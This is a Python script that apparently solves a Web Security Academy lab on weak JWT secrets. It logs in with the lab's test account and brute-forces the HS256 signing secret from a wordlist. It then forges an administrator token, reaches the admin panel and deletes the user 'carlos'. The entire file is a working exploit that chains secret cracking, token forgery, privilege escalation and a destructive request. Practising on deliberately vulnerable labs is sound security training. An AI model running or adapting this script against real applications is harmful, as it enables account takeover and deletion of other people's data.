import requests, base64, json, hmac, hashlib, jwt as pyjwt    
from bs4 import BeautifulSoup

s = requests.Session()
site = '0aa1004203ee464283ce002e00a0008a.web-security-academy.net'
login_url = f'https://{site}/login'
admin_url = f'https://{site}/admin'
resp = s.get(login_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

logindata = {
    'csrf' : csrf,
    'username' : 'wiener',
    'password' : 'peter'
}

resp = s.post(login_url, data = logindata) # log in to get jwt with csrf token

jwt = s.cookies.get("session") # jwt is in the session cookie, we can use it to access the admin page

# brute force jwt secret with pyjwt and a wordlist
print("Cracking JWT secret...")
# run the crack
with open("jwt.secrets.list", "r", errors="ignore") as f:
        for line in f:
            secret = line.strip()
            try:
                pyjwt.decode(jwt, secret, algorithms=["HS256"])
                break
            except pyjwt.exceptions.InvalidSignatureError:
                continue  # wrong secret, try next
            except Exception:
                continue  # malformed etc, skip
print("JWT secret cracking complete. The secret is " + secret)

# create new jwt with admin role, administrator sub, and new signature using the secret found with hashcat
header = base64.urlsafe_b64encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).decode().rstrip('=')
payload = base64.urlsafe_b64encode(json.dumps({"sub": "administrator", "role": "admin"}).encode()).decode().rstrip('=')
signature = hmac.new(secret.encode(), f'{header}.{payload}'.encode(), hashlib.sha256).digest()
signature = base64.urlsafe_b64encode(signature).decode().rstrip('=')
new_jwt = f'{header}.{payload}.{signature}' # create the new jwt with the new header, payload, and signature 
print (f'Edited JWT: {new_jwt}')


# log in to admin page
resp = s.get(admin_url, headers = {'Cookie' : f'session={new_jwt}'}) # access admin page with edited jwt

# find carlos delete link and delete carlos
soup = BeautifulSoup(resp.text,'html.parser')

carlos_delete_link = [link for link in soup.find_all('a') if 'carlos' in link.get('href')]

delete_uri = carlos_delete_link[0]['href']

s.get(f'https://{site}{delete_uri}', headers = {'Cookie' : f'session={new_jwt}'}) # delete carlos